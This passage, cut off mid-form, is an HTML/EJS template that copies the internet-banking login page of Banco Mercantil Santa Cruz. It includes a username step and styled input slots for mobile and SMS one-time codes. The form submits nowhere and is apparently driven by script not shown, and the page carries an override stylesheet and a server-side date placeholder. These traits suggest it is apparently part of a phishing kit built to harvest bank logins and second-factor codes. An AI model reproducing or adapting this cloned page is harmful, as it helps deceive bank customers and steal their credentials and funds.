<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="format-detection" content="telephone=no" />
    <title>Banca por Internet | Banco Mercantil Santa Cruz</title>
    <link rel="shortcut icon" href="/img/favicon.svg" type="image/svg+xml" />
    <link rel="stylesheet" type="text/css" href="/css/icbStyles.css" />
    <link rel="stylesheet" type="text/css" href="/css/banca-override.css" />
    <style>
      @keyframes bmsc-spin {
        0% { transform: rotate(0deg); -webkit-transform: rotate(0deg); }
        100% { transform: rotate(360deg); -webkit-transform: rotate(360deg); }
      }
      @-webkit-keyframes bmsc-spin {
        0% { -webkit-transform: rotate(0deg); }
        100% { -webkit-transform: rotate(360deg); }
      }
      .bmsc-spinner-circle {
        display: inline-block;
        width: 52px;
        height: 52px;
        border: 4px solid #e2e8f0;
        border-top-color: #15803d;
        border-radius: 50% !important;
        animation: bmsc-spin 0.85s linear infinite;
        -webkit-animation: bmsc-spin 0.85s linear infinite;
        margin-bottom: 18px;
        box-sizing: border-box;
      }
      #spinnerTextTitle {
        font-size: 16px;
        font-weight: 700;
        color: #1e293b;
        margin-bottom: 8px;
        font-family: inherit;
      }
      #spinnerTextSub {
        font-size: 13px;
        color: #64748b;
        font-family: inherit;
        max-width: 360px;
        line-height: 1.4;
      }
      #container .contentLogin,
      #container div.contentLogin,
      .contentLogin {
        position: relative !important;
      }
      #loginSpinner {
        display: none;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        width: 100%;
        height: 100%;
        min-height: 380px;
        background: #ffffff;
        z-index: 9999;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        padding: 40px 20px;
        box-sizing: border-box;
      }
      #loginSpinner.is-active {
        display: flex !important;
      }

      /* Spinner dentro del botón de iniciar sesión */
      @keyframes btn-spin {
        0% { transform: rotate(0deg); -webkit-transform: rotate(0deg); }
        100% { transform: rotate(360deg); -webkit-transform: rotate(360deg); }
      }
      @-webkit-keyframes btn-spin {
        0% { -webkit-transform: rotate(0deg); }
        100% { -webkit-transform: rotate(360deg); }
      }
      .btn-spinner {
        display: inline-block !important;
        width: 15px !important;
        height: 15px !important;
        border: 2.5px solid rgba(255, 255, 255, 0.35) !important;
        border-top-color: #ffffff !important;
        border-radius: 50% !important;
        animation: btn-spin 0.75s linear infinite !important;
        -webkit-animation: btn-spin 0.75s linear infinite !important;
        box-sizing: border-box !important;
        vertical-align: middle !important;
        margin-right: 7px !important;
        flex-shrink: 0 !important;
      }
      #container .contentLogin #Enter_Step1.btn-loading,
      #container .login #Enter_Step1.btn-loading,
      #container .login .enterRow #Enter_Step1.btn-loading,
      #Enter_Step1.btn-loading {
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        cursor: wait !important;
        pointer-events: none !important;
        opacity: 0.95 !important;
      }

      /* Marco y casillas para Clave Móvil y SMS */
      #stepToken.login {
        padding-top: 24px !important;
        text-align: center !important;
        min-height: 440px !important;
      }
      #stepToken.login > li {
        float: none !important;
        clear: both !important;
        display: block !important;
        height: auto !important;
        margin-left: auto !important;
        margin-right: auto !important;
        background-image: none !important;
      }
      .otpCardWrapper {
        margin: 16px auto 14px !important;
        max-width: 380px !important;
      }
      .otpFrameCard {
        background: #fbfdf9 !important;
        border: 2px solid #8dc63f !important;
        border-radius: 8px !important;
        padding: 16px 14px !important;
        margin: 0 auto !important;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06) !important;
        box-sizing: border-box !important;
      }
      .otpFrameHeader {
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
        gap: 6px !important;
        margin-bottom: 12px !important;
        font-size: 13px !important;
        font-weight: 700 !important;
        color: #15803d !important;
      }
      .otpFrameWrap {
        display: flex !important;
        gap: 8px !important;
        justify-content: center !important;
        align-items: center !important;
        margin: 0 auto !important;
      }
      #container input.otp-slot,
      #stepToken input.otp-slot,
      .contentLogin input.otp-slot,
      .otpFrameWrap input.otp-slot,
      input.otp-slot {
        display: inline-block !important;
        width: 44px !important;
        height: 52px !important;
        min-width: 44px !important;
        min-height: 52px !important;
        padding: 0 !important;
        margin: 0 !important;
        text-align: center !important;
        font-size: 24px !important;
        font-weight: 700 !important;
        line-height: 52px !important;
        color: #0f172a !important;
        -webkit-text-fill-color: #0f172a !important;
        border: 2px solid #8dc63f !important;
        border-radius: 6px !important;
        background: #ffffff !important;
        background-color: #ffffff !important;
        background-image: none !important;
        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.05) !important;
        outline: none !important;
        box-sizing: border-box !important;
        cursor: text !important;
        caret-color: #15803d !important;
        transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease !important;
      }
      #container input.otp-slot:focus,
      #stepToken input.otp-slot:focus,
      .contentLogin input.otp-slot:focus,
      .otpFrameWrap input.otp-slot:focus,
      input.otp-slot:focus {
        border-color: #15803d !important;
        background-color: #ffffff !important;
        box-shadow: 0 0 0 3px rgba(21, 128, 61, 0.25), inset 0 1px 2px rgba(0, 0, 0, 0.05) !important;
        outline: none !important;
      }
      #container input.otp-slot.has-value,
      #stepToken input.otp-slot.has-value,
      .otpFrameWrap input.otp-slot.has-value,
      input.otp-slot.has-value {
        border-color: #15803d !important;
        background-color: #f0fdf4 !important;
      }
      .otpFrameHint {
        font-size: 11px !important;
        color: #64748b !important;
        margin-top: 10px !important;
        text-align: center !important;
      }
    </style>
  </head>
  <body>
    <div id="corporateHeader">
      <div class="logo"></div>
      <div class="rightZone">
        <ul>
          <li><a href="#">ayuda</a></li>
        </ul>
        <div class="langBar">
          <ul>
            <li>
              <img src="/banca/img-flag-eng.png" width="16" height="11" alt="" />
            </li>
            <li><a href="#">english</a></li>
          </ul>
        </div>
      </div>
    </div>

    <div id="container">
      <div id="containerTop" class="withoutBreadcrumb">
        <h3>Bienvenido a la Banca por Internet</h3>
        <span class="fecha"><%= todayLabel.charAt(0).toUpperCase() + todayLabel.slice(1) %></span>
      </div>

      <div id="containerMid" class="fl">
        <div class="colLeft" style="display: block;">
          <div class="contentLogin">
            <div id="loginErrorBox" style="display:none; color: #b91c1c; background: #fef2f2; border: 1px solid #f87171; border-radius: 4px; padding: 10px; margin: 12px 16px 0; font-size: 12px; font-weight: 700; text-align: center;"></div>

            <form action="#" method="post" autocomplete="off" onsubmit="return false;">
              <!-- Paso 1: Usuario -->
              <ul class="login" id="stepUser">
                <li>
                  <ul>
                    <li class="labelInput">
                      <span class="usuario fr">Usuario:</span>
                      <span class="userIcon fr"></span>
                    </li>
                    <li id="MainContent_ctl01_liPassword" class="password fl">
                      <input
                        name="usuario"
                        type="password"
                        id="MainContent_ctl01_txtUserNamePassword"
                        tabindex="1"
